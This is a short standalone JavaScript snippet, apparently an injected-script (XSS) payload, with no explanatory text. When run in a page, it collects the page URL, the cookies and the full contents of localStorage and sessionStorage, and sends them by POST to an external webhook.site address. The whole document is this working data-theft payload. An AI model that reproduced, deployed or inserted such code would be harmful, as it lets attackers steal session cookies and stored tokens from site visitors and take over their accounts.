(async () => {
  const payload = {
    url: location.href,
    cookie: document.cookie,
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage },
  };

  await fetch("https://webhook.site/a224cd5d-4479-4063-9d74-f207c17f7bd8", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(payload),
  });
})();
